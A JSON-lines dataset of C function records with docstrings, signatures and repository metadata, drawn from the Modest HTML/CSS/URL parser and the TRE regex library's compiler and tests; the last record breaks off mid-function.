{"docstring": "/////////////////////////////////////////////////////////\n//// anything else\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_delim_single_code_point(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = css_offset - token->begin;\n    token->type   = MyCSS_TOKEN_TYPE_DELIM;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/**\n *  Internal function to process attributes\n *  @param  tree\n *  @param  attr\n *  @param  callback\n *  @param  ptr\n */\n", "func_signal": "mystatus_t myhtml_serialization_attributes(myhtml_tree_t* tree, myhtml_tree_attr_t* attr, mycore_callback_serialize_f callback, void* ptr)", "code": "{\n    while(attr) {\n        if(callback(\" \", 1, ptr))\n            return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n        \n        switch (attr->ns) {\n            case MyHTML_NAMESPACE_XML:\n                if(callback(\"xml:\", 4, ptr))\n                    return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n                \n                break;\n            case MyHTML_NAMESPACE_XMLNS: {\n                /*\n                    If the attribute is in the XMLNS namespace and the attribute's local name is not xmlns\n                    The attribute's serialized name is the string \"xmlns:\" followed by the attribute's local name.\n                 */\n                if(attr->key.data && attr->key.length == 5 && mycore_strcmp(attr->key.data, \"xmlns\")) {\n                    if(callback(\"xmlns:\", 6, ptr))\n                        return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n                }\n                \n                break;\n            }\n            case MyHTML_NAMESPACE_XLINK: {\n                if(callback(\"xlink:\", 6, ptr))\n                    return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n                \n                break;\n            }\n            default:\n                break;\n        }\n        \n        \n        size_t length;\n        const char *data = myhtml_attribute_key(attr, &length);\n        if(data) {\n            if(callback(data, length, ptr))\n                return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n        }\n        if(callback(\"=\\\"\", 2, ptr))\n            return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n        \n        data = myhtml_attribute_value(attr, &length);\n        if(data) {\n            if(myhtml_serialization_append_attr(data, length, callback, ptr))\n                return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n        }\n        if(callback(\"\\\"\", 1, ptr))\n            return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n        \n        attr = attr->next;\n    }\n    \n    return MyCORE_STATUS_OK;\n}", "path": "Modest/source/myhtml/serialization.c", "commit_date": "2019-01-12 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// Consume a unicode-range token\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_global_state_unicode_range_before(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = (entry->current_buffer->offset + css_offset) - token->begin;\n    token->type   = MyCSS_TOKEN_TYPE_UNICODE_RANGE;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// U+003B SEMICOLON (;)\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_semicolon(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = 1;\n    token->type = MyCSS_TOKEN_TYPE_SEMICOLON;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// Consume an ident-like token\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_global_state_ident(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->type = MyCSS_TOKEN_TYPE_IDENT;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// Global back\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_global_back(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// Consume a number\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_global_state_number_digit(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = (entry->current_buffer->offset + css_offset) - token->begin;\n    mycss_tokenizer_end_run_state_single(entry, entry->state_back, css, css_offset, css_size);\n    \n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// Consume a string token\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_global_state_string_double_quoted(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = (entry->current_buffer->offset + css_offset) - token->begin;\n    token->type   = MyCSS_TOKEN_TYPE_BAD_STRING;\n    \n    mycss_tokenizer_end_run_state_single(entry, entry->state_back, css, css_offset, css_size);\n    \n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// U+007C VERTICAL LINE (|)\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_vertical_line(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = 1;\n    token->type   = MyCSS_TOKEN_TYPE_DELIM;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// name-start code point\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_name_start_code_point(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = 1;\n    token->type = MyCSS_TOKEN_TYPE_IDENT;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/**\n *  Internal function to process a text node\n *  @param  tree\n *  @param  node\n *  @param  callback\n *  @param  ptr\n */\n", "func_signal": "mystatus_t myhtml_serialization_node_append_text_node(myhtml_tree_node_t* node, mycore_callback_serialize_f callback, void* ptr)", "code": "{\n    if(node->token == NULL || node->token->str.data == NULL) return MyCORE_STATUS_OK;\n    \n    if(node->parent == NULL) {\n        if(myhtml_serialization_append(node->token->str.data, node->token->str.length, callback, ptr))\n            return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n        \n        return MyCORE_STATUS_OK;\n    }\n    \n    switch (node->parent->tag_id) {\n        case MyHTML_TAG_STYLE:\n        case MyHTML_TAG_SCRIPT:\n        case MyHTML_TAG_XMP:\n        case MyHTML_TAG_IFRAME:\n        case MyHTML_TAG_NOEMBED:\n        case MyHTML_TAG_NOFRAMES:\n        case MyHTML_TAG_PLAINTEXT:\n            if(callback(node->token->str.data, node->token->str.length, ptr))\n                return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n            break;\n        default:\n            if(myhtml_serialization_append(node->token->str.data, node->token->str.length, callback, ptr))\n                return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n            \n            break;\n    }\n    \n    return MyCORE_STATUS_OK;\n}", "path": "Modest/source/myhtml/serialization.c", "commit_date": "2019-01-12 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/* converter */\n", "func_signal": "char * myurl_utils_percent_encode(myurl_t* url, const char* data, size_t size, const unsigned char* encode_set, size_t* return_length)", "code": "{\n    size_t new_size = size;\n    const unsigned char *u_data = (const unsigned char*)data;\n    \n    size_t len;\n    for(len = 0; len < size; len++) {\n        if(encode_set[ u_data[len] ] == 0x00)\n            new_size += 2;\n    }\n    \n    char *out = url->callback_malloc((sizeof(char) * new_size) + 1, url->callback_ctx);\n    if(out == NULL) {\n        if(return_length)\n            *return_length = 0;\n        \n        return NULL;\n    }\n    \n    char *out_link = out;\n    \n    len = 0;\n    while(len < size)\n    {\n        if(encode_set[ u_data[len] ] == 0x00) {\n            const char *two_hex = mycore_string_char_to_two_hex_value[ u_data[len] ];\n            \n            *out = '%'; out++;\n            *out = (char)mycore_string_chars_uppercase_map[ (unsigned char)two_hex[0] ]; out++;\n            *out = (char)mycore_string_chars_uppercase_map[ (unsigned char)two_hex[1] ]; out++;\n            *out = '\\0';\n        }\n        else {\n            *out = data[len];\n            out++;\n        }\n        \n        len++;\n    }\n    \n    *out = '\\0';\n    \n    if(return_length)\n        *return_length = new_size;\n    \n    return out_link;\n}", "path": "Modest/source/myurl/utils.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/* Computes and fills in the fields `nullable', `firstpos', and `lastpos' for\n   the nodes of the AST `tree'. */\n", "func_signal": "static reg_errcode_t\ntre_compute_nfl(tre_mem_t mem, tre_stack_t *stack, tre_ast_node_t *tree)", "code": "{\n  int bottom = tre_stack_num_objects(stack);\n\n  STACK_PUSHR(stack, voidptr, tree);\n  STACK_PUSHR(stack, int, NFL_RECURSE);\n\n  while (tre_stack_num_objects(stack) > bottom)\n    {\n      tre_nfl_stack_symbol_t symbol;\n      tre_ast_node_t *node;\n\n      symbol = (tre_nfl_stack_symbol_t)tre_stack_pop_int(stack);\n      node = tre_stack_pop_voidptr(stack);\n      switch (symbol)\n\t{\n\tcase NFL_RECURSE:\n\t  switch (node->type)\n\t    {\n\t    case LITERAL:\n\t      {\n\t\ttre_literal_t *lit = (tre_literal_t *)node->obj;\n\t\tif (IS_BACKREF(lit))\n\t\t  {\n\t\t    /* Back references: nullable = false, firstpos = {i},\n\t\t       lastpos = {i}. */\n\t\t    node->nullable = 0;\n\t\t    node->firstpos = tre_set_one(mem, lit->position, 0,\n\t\t\t\t\t     TRE_CHAR_MAX, 0, NULL, -1);\n\t\t    if (!node->firstpos)\n\t\t      return REG_ESPACE;\n\t\t    node->lastpos = tre_set_one(mem, lit->position, 0,\n\t\t\t\t\t\tTRE_CHAR_MAX, 0, NULL,\n\t\t\t\t\t\t(int)lit->code_max);\n\t\t    if (!node->lastpos)\n\t\t      return REG_ESPACE;\n\t\t  }\n\t\telse if (lit->code_min < 0)\n\t\t  {\n\t\t    /* Tags, empty strings, params, and zero width assertions:\n\t\t       nullable = true, firstpos = {}, and lastpos = {}. */\n\t\t    node->nullable = 1;\n\t\t    node->firstpos = tre_set_empty(mem);\n\t\t    if (!node->firstpos)\n\t\t      return REG_ESPACE;\n\t\t    node->lastpos = tre_set_empty(mem);\n\t\t    if (!node->lastpos)\n\t\t      return REG_ESPACE;\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    /* Literal at position i: nullable = false, firstpos = {i},\n\t\t       lastpos = {i}. */\n\t\t    node->nullable = 0;\n\t\t    node->firstpos =\n\t\t      tre_set_one(mem, lit->position, (int)lit->code_min,\n\t\t\t\t  (int)lit->code_max, 0, NULL, -1);\n\t\t    if (!node->firstpos)\n\t\t      return REG_ESPACE;\n\t\t    node->lastpos = tre_set_one(mem, lit->position,\n\t\t\t\t\t\t(int)lit->code_min,\n\t\t\t\t\t\t(int)lit->code_max,\n\t\t\t\t\t\tlit->u.class, lit->neg_classes,\n\t\t\t\t\t\t-1);\n\t\t    if (!node->lastpos)\n\t\t      return REG_ESPACE;\n\t\t  }\n\t\tbreak;\n\t      }\n\n\t    case UNION:\n\t      /* Compute the attributes for the two subtrees, and after that\n\t\t for this node. */\n\t      STACK_PUSHR(stack, voidptr, node);\n\t      STACK_PUSHR(stack, int, NFL_POST_UNION);\n\t      STACK_PUSHR(stack, voidptr, ((tre_union_t *)node->obj)->right);\n\t      STACK_PUSHR(stack, int, NFL_RECURSE);\n\t      STACK_PUSHR(stack, voidptr, ((tre_union_t *)node->obj)->left);\n\t      STACK_PUSHR(stack, int, NFL_RECURSE);\n\t      break;\n\n\t    case CATENATION:\n\t      /* Compute the attributes for the two subtrees, and after that\n\t\t for this node. */\n\t      STACK_PUSHR(stack, voidptr, node);\n\t      STACK_PUSHR(stack, int, NFL_POST_CATENATION);\n\t      STACK_PUSHR(stack, voidptr, ((tre_catenation_t *)node->obj)->right);\n\t      STACK_PUSHR(stack, int, NFL_RECURSE);\n\t      STACK_PUSHR(stack, voidptr, ((tre_catenation_t *)node->obj)->left);\n\t      STACK_PUSHR(stack, int, NFL_RECURSE);\n\t      break;\n\n\t    case ITERATION:\n\t      /* Compute the attributes for the subtree, and after that for\n\t\t this node. */\n\t      STACK_PUSHR(stack, voidptr, node);\n\t      STACK_PUSHR(stack, int, NFL_POST_ITERATION);\n\t      STACK_PUSHR(stack, voidptr, ((tre_iteration_t *)node->obj)->arg);\n\t      STACK_PUSHR(stack, int, NFL_RECURSE);\n\t      break;\n\t    }\n\t  break; /* end case: NFL_RECURSE */\n\n\tcase NFL_POST_UNION:\n\t  {\n\t    tre_union_t *uni = (tre_union_t *)node->obj;\n\t    node->nullable = uni->left->nullable || uni->right->nullable;\n\t    node->firstpos = tre_set_union(mem, uni->left->firstpos,\n\t\t\t\t\t   uni->right->firstpos, NULL, 0, NULL);\n\t    if (!node->firstpos)\n\t      return REG_ESPACE;\n\t    node->lastpos = tre_set_union(mem, uni->left->lastpos,\n\t\t\t\t\t  uni->right->lastpos, NULL, 0, NULL);\n\t    if (!node->lastpos)\n\t      return REG_ESPACE;\n\t    break;\n\t  }\n\n\tcase NFL_POST_ITERATION:\n\t  {\n\t    tre_iteration_t *iter = (tre_iteration_t *)node->obj;\n\n\t    if (iter->min == 0 || iter->arg->nullable)\n\t      node->nullable = 1;\n\t    else\n\t      node->nullable = 0;\n\t    node->firstpos = iter->arg->firstpos;\n\t    node->lastpos = iter->arg->lastpos;\n\t    break;\n\t  }\n\n\tcase NFL_POST_CATENATION:\n\t  {\n\t    int num_tags, *tags, assertions, params_seen;\n\t    int *params;\n\t    reg_errcode_t status;\n\t    tre_catenation_t *cat = node->obj;\n\t    node->nullable = cat->left->nullable && cat->right->nullable;\n\n\t    /* Compute firstpos. */\n\t    if (cat->left->nullable)\n\t      {\n\t\t/* The left side matches the empty string.  Make a first pass\n\t\t   with tre_match_empty() to get the number of tags and\n\t\t   parameters. */\n\t\tstatus = tre_match_empty(stack, cat->left,\n\t\t\t\t\t NULL, NULL, NULL, &num_tags,\n\t\t\t\t\t &params_seen);\n\t\tif (status != REG_OK)\n\t\t  return status;\n\t\t/* Allocate arrays for the tags and parameters. */\n\t\ttags = xmalloc(sizeof(*tags) * (num_tags + 1));\n\t\tif (!tags)\n\t\t  return REG_ESPACE;\n\t\ttags[0] = -1;\n\t\tassertions = 0;\n\t\tparams = NULL;\n\t\tif (params_seen)\n\t\t  {\n\t\t    params = tre_mem_alloc(mem, sizeof(*params)\n\t\t\t\t\t   * TRE_PARAM_LAST);\n\t\t    if (!params)\n\t\t      {\n\t\t\txfree(tags);\n\t\t\treturn REG_ESPACE;\n\t\t      }\n\t\t  }\n\t\t/* Second pass with tre_mach_empty() to get the list of\n\t\t   tags and parameters. */\n\t\tstatus = tre_match_empty(stack, cat->left, tags,\n\t\t\t\t\t &assertions, params, NULL, NULL);\n\t\tif (status != REG_OK)\n\t\t  {\n\t\t    xfree(tags);\n\t\t    return status;\n\t\t  }\n\t\tnode->firstpos =\n\t\t  tre_set_union(mem, cat->right->firstpos, cat->left->firstpos,\n\t\t\t\ttags, assertions, params);\n\t\txfree(tags);\n\t\tif (!node->firstpos)\n\t\t  return REG_ESPACE;\n\t      }\n\t    else\n\t      {\n\t\tnode->firstpos = cat->left->firstpos;\n\t      }\n\n\t    /* Compute lastpos. */\n\t    if (cat->right->nullable)\n\t      {\n\t\t/* The right side matches the empty string.  Make a first pass\n\t\t   with tre_match_empty() to get the number of tags and\n\t\t   parameters. */\n\t\tstatus = tre_match_empty(stack, cat->right,\n\t\t\t\t\t NULL, NULL, NULL, &num_tags,\n\t\t\t\t\t &params_seen);\n\t\tif (status != REG_OK)\n\t\t  return status;\n\t\t/* Allocate arrays for the tags and parameters. */\n\t\ttags = xmalloc(sizeof(int) * (num_tags + 1));\n\t\tif (!tags)\n\t\t  return REG_ESPACE;\n\t\ttags[0] = -1;\n\t\tassertions = 0;\n\t\tparams = NULL;\n\t\tif (params_seen)\n\t\t  {\n\t\t    params = tre_mem_alloc(mem, sizeof(*params)\n\t\t\t\t\t   * TRE_PARAM_LAST);\n\t\t    if (!params)\n\t\t      {\n\t\t\txfree(tags);\n\t\t\treturn REG_ESPACE;\n\t\t      }\n\t\t  }\n\t\t/* Second pass with tre_mach_empty() to get the list of\n\t\t   tags and parameters. */\n\t\tstatus = tre_match_empty(stack, cat->right, tags,\n\t\t\t\t\t &assertions, params, NULL, NULL);\n\t\tif (status != REG_OK)\n\t\t  {\n\t\t    xfree(tags);\n\t\t    return status;\n\t\t  }\n\t\tnode->lastpos =\n\t\t  tre_set_union(mem, cat->left->lastpos, cat->right->lastpos,\n\t\t\t\ttags, assertions, params);\n\t\txfree(tags);\n\t\tif (!node->lastpos)\n\t\t  return REG_ESPACE;\n\t      }\n\t    else\n\t      {\n\t\tnode->lastpos = cat->right->lastpos;\n\t      }\n\t    break;\n\t  }\n\n\tdefault:\n\t  assert(0);\n\t  break;\n\t}\n    }\n\n  return REG_OK;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Converts the syntax tree to a TNFA.\tAll the transitions in the TNFA are\n   labelled with one character range (there are no transitions on empty\n   strings).  The TNFA takes O(n^2) space in the worst case, `n' is size of\n   the regexp. */\n", "func_signal": "static reg_errcode_t\ntre_ast_to_tnfa(tre_ast_node_t *node, tre_tnfa_transition_t *transitions,\n\t\tint *counts, int *offs)", "code": "{\n  tre_union_t *uni;\n  tre_catenation_t *cat;\n  tre_iteration_t *iter;\n  reg_errcode_t errcode = REG_OK;\n\n  /* XXX - recurse using a stack!. */\n  switch (node->type)\n    {\n    case LITERAL:\n      break;\n    case UNION:\n      uni = (tre_union_t *)node->obj;\n      errcode = tre_ast_to_tnfa(uni->left, transitions, counts, offs);\n      if (errcode != REG_OK)\n\treturn errcode;\n      errcode = tre_ast_to_tnfa(uni->right, transitions, counts, offs);\n      break;\n\n    case CATENATION:\n      cat = (tre_catenation_t *)node->obj;\n      /* Add a transition from each position in cat->left->lastpos\n\t to each position in cat->right->firstpos. */\n      errcode = tre_make_trans(cat->left->lastpos, cat->right->firstpos,\n\t\t\t       transitions, counts, offs);\n      if (errcode != REG_OK)\n\treturn errcode;\n      errcode = tre_ast_to_tnfa(cat->left, transitions, counts, offs);\n      if (errcode != REG_OK)\n\treturn errcode;\n      errcode = tre_ast_to_tnfa(cat->right, transitions, counts, offs);\n      break;\n\n    case ITERATION:\n      iter = (tre_iteration_t *)node->obj;\n      assert(iter->max == -1 || iter->max == 1);\n\n      if (iter->max == -1)\n\t{\n\t  assert(iter->min == 0 || iter->min == 1);\n\t  /* Add a transition from each last position in the iterated\n\t     expression to each first position. */\n\t  errcode = tre_make_trans(iter->arg->lastpos, iter->arg->firstpos,\n\t\t\t\t   transitions, counts, offs);\n\t  if (errcode != REG_OK)\n\t    return errcode;\n\t}\n      errcode = tre_ast_to_tnfa(iter->arg, transitions, counts, offs);\n      break;\n    }\n  return errcode;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* The get_next_char() handler.  Sets `c' to the value of the next character,\n   and increases `pos_add' by the number of bytes read.  Returns 1 if the\n   string has ended, 0 if there are more characters. */\n", "func_signal": "static int\nstr_handler_get_next(tre_char_t *c, unsigned int *pos_add, void *context)", "code": "{\n  str_handler_ctx *ctx = context;\n  unsigned char ch = ctx->str[ctx->pos];\n\n  printf(\"str[%lu] = %d\\n\", (unsigned long)ctx->pos, ch);\n  *c = ch;\n  if (ch)\n    ctx->pos++;\n  *pos_add = 1;\n\n  return ch == '\\0';\n}", "path": "tre/tests/test-str-source.c", "commit_date": "2009-09-19 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Expands each iteration node that has a finite nonzero minimum or maximum\n   iteration count to a catenated sequence of copies of the node. */\n", "func_signal": "static reg_errcode_t\ntre_expand_ast(tre_mem_t mem, tre_stack_t *stack, tre_ast_node_t *ast,\n\t       int *position, tre_tag_direction_t *tag_directions,\n\t       int *max_depth)", "code": "{\n  reg_errcode_t status = REG_OK;\n  int bottom = tre_stack_num_objects(stack);\n  int pos_add = 0;\n  int pos_add_total = 0;\n  int max_pos = 0;\n  /* Current approximate matching parameters. */\n  int params[TRE_PARAM_LAST];\n  /* Approximate parameter nesting level. */\n  int params_depth = 0;\n  int iter_depth = 0;\n  int i;\n\n  for (i = 0; i < TRE_PARAM_LAST; i++)\n    params[i] = TRE_PARAM_DEFAULT;\n\n  STACK_PUSHR(stack, voidptr, ast);\n  STACK_PUSHR(stack, int, EXPAND_RECURSE);\n  while (status == REG_OK && tre_stack_num_objects(stack) > bottom)\n    {\n      tre_ast_node_t *node;\n      tre_expand_ast_symbol_t symbol;\n\n      if (status != REG_OK)\n\tbreak;\n\n      DPRINT((\"pos_add %d\\n\", pos_add));\n\n      symbol = (tre_expand_ast_symbol_t)tre_stack_pop_int(stack);\n      node = tre_stack_pop_voidptr(stack);\n      switch (symbol)\n\t{\n\tcase EXPAND_RECURSE:\n\t  switch (node->type)\n\t    {\n\t    case LITERAL:\n\t      {\n\t\ttre_literal_t *lit= node->obj;\n\t\tif (!IS_SPECIAL(lit) || IS_BACKREF(lit))\n\t\t  {\n\t\t    lit->position += pos_add;\n\t\t    if (lit->position > max_pos)\n\t\t      max_pos = lit->position;\n\t\t  }\n\t\tbreak;\n\t      }\n\t    case UNION:\n\t      {\n\t\ttre_union_t *uni = node->obj;\n\t\tSTACK_PUSHX(stack, voidptr, uni->right);\n\t\tSTACK_PUSHX(stack, int, EXPAND_RECURSE);\n\t\tSTACK_PUSHX(stack, voidptr, uni->left);\n\t\tSTACK_PUSHX(stack, int, EXPAND_RECURSE);\n\t\tbreak;\n\t      }\n\t    case CATENATION:\n\t      {\n\t\ttre_catenation_t *cat = node->obj;\n\t\tSTACK_PUSHX(stack, voidptr, cat->right);\n\t\tSTACK_PUSHX(stack, int, EXPAND_RECURSE);\n\t\tSTACK_PUSHX(stack, voidptr, cat->left);\n\t\tSTACK_PUSHX(stack, int, EXPAND_RECURSE);\n\t\tbreak;\n\t      }\n\t    case ITERATION:\n\t      {\n\t\ttre_iteration_t *iter = node->obj;\n\t\tSTACK_PUSHX(stack, int, pos_add);\n\t\tSTACK_PUSHX(stack, voidptr, node);\n\t\tSTACK_PUSHX(stack, int, EXPAND_AFTER_ITER);\n\t\tSTACK_PUSHX(stack, voidptr, iter->arg);\n\t\tSTACK_PUSHX(stack, int, EXPAND_RECURSE);\n\t\t/* If we are going to expand this node at EXPAND_AFTER_ITER\n\t\t   then don't increase the `pos' fields of the nodes now, it\n\t\t   will get done when expanding. */\n\t\tif (iter->min > 1 || iter->max > 1)\n\t\t  pos_add = 0;\n\t\titer_depth++;\n\t\tDPRINT((\"iter\\n\"));\n\t\tbreak;\n\t      }\n\t    default:\n\t      assert(0);\n\t      break;\n\t    }\n\t  break;\n\tcase EXPAND_AFTER_ITER:\n\t  {\n\t    tre_iteration_t *iter = node->obj;\n\t    int pos_add_last;\n\t    pos_add = tre_stack_pop_int(stack);\n\t    pos_add_last = pos_add;\n\t    if (iter->min > 1 || iter->max > 1)\n\t      {\n\t\ttre_ast_node_t *seq1 = NULL, *seq2 = NULL;\n\t\tint j;\n\t\tint pos_add_save = pos_add;\n\n\t\t/* Create a catenated sequence of copies of the node. */\n\t\tfor (j = 0; j < iter->min; j++)\n\t\t  {\n\t\t    tre_ast_node_t *copy;\n\t\t    /* Remove tags from all but the last copy. */\n\t\t    int flags = ((j + 1 < iter->min)\n\t\t\t\t ? COPY_REMOVE_TAGS\n\t\t\t\t : COPY_MAXIMIZE_FIRST_TAG);\n\t\t    DPRINT((\"  pos_add %d\\n\", pos_add));\n\t\t    pos_add_save = pos_add;\n\t\t    status = tre_copy_ast(mem, stack, iter->arg, flags,\n\t\t\t\t\t  &pos_add, tag_directions, &copy,\n\t\t\t\t\t  &max_pos);\n\t\t    if (status != REG_OK)\n\t\t      return status;\n\t\t    if (seq1 != NULL)\n\t\t      seq1 = tre_ast_new_catenation(mem, seq1, copy);\n\t\t    else\n\t\t      seq1 = copy;\n\t\t    if (seq1 == NULL)\n\t\t      return REG_ESPACE;\n\t\t  }\n\n\t\tif (iter->max == -1)\n\t\t  {\n\t\t    /* No upper limit. */\n\t\t    pos_add_save = pos_add;\n\t\t    status = tre_copy_ast(mem, stack, iter->arg, 0,\n\t\t\t\t\t  &pos_add, NULL, &seq2, &max_pos);\n\t\t    if (status != REG_OK)\n\t\t      return status;\n\t\t    seq2 = tre_ast_new_iter(mem, seq2, 0, -1, 0);\n\t\t    if (seq2 == NULL)\n\t\t      return REG_ESPACE;\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    for (j = iter->min; j < iter->max; j++)\n\t\t      {\n\t\t\ttre_ast_node_t *tmp, *copy;\n\t\t\tpos_add_save = pos_add;\n\t\t\tstatus = tre_copy_ast(mem, stack, iter->arg, 0,\n\t\t\t\t\t      &pos_add, NULL, &copy, &max_pos);\n\t\t\tif (status != REG_OK)\n\t\t\t  return status;\n\t\t\tif (seq2 != NULL)\n\t\t\t  seq2 = tre_ast_new_catenation(mem, copy, seq2);\n\t\t\telse\n\t\t\t  seq2 = copy;\n\t\t\tif (seq2 == NULL)\n\t\t\t  return REG_ESPACE;\n\t\t\ttmp = tre_ast_new_literal(mem, EMPTY, -1, -1);\n\t\t\tif (tmp == NULL)\n\t\t\t  return REG_ESPACE;\n\t\t\tseq2 = tre_ast_new_union(mem, tmp, seq2);\n\t\t\tif (seq2 == NULL)\n\t\t\t  return REG_ESPACE;\n\t\t      }\n\t\t  }\n\n\t\tpos_add = pos_add_save;\n\t\tif (seq1 == NULL)\n\t\t  seq1 = seq2;\n\t\telse if (seq2 != NULL)\n\t\t  seq1 = tre_ast_new_catenation(mem, seq1, seq2);\n\t\tif (seq1 == NULL)\n\t\t  return REG_ESPACE;\n\t\tnode->obj = seq1->obj;\n\t\tnode->type = seq1->type;\n\t      }\n\n\t    iter_depth--;\n\t    pos_add_total += pos_add - pos_add_last;\n\t    if (iter_depth == 0)\n\t      pos_add = pos_add_total;\n\n\t    /* If approximate parameters are specified, surround the result\n\t       with two parameter setting nodes.  The one on the left sets\n\t       the specified parameters, and the one on the right restores\n\t       the old parameters. */\n\t    if (iter->params)\n\t      {\n\t\ttre_ast_node_t *tmp_l, *tmp_r, *tmp_node, *node_copy;\n\t\tint *old_params;\n\n\t\ttmp_l = tre_ast_new_literal(mem, PARAMETER, 0, -1);\n\t\tif (!tmp_l)\n\t\t  return REG_ESPACE;\n\t\t((tre_literal_t *)tmp_l->obj)->u.params = iter->params;\n\t\titer->params[TRE_PARAM_DEPTH] = params_depth + 1;\n\t\ttmp_r = tre_ast_new_literal(mem, PARAMETER, 0, -1);\n\t\tif (!tmp_r)\n\t\t  return REG_ESPACE;\n\t\told_params = tre_mem_alloc(mem, sizeof(*old_params)\n\t\t\t\t\t   * TRE_PARAM_LAST);\n\t\tif (!old_params)\n\t\t  return REG_ESPACE;\n\t\tfor (i = 0; i < TRE_PARAM_LAST; i++)\n\t\t  old_params[i] = params[i];\n\t\t((tre_literal_t *)tmp_r->obj)->u.params = 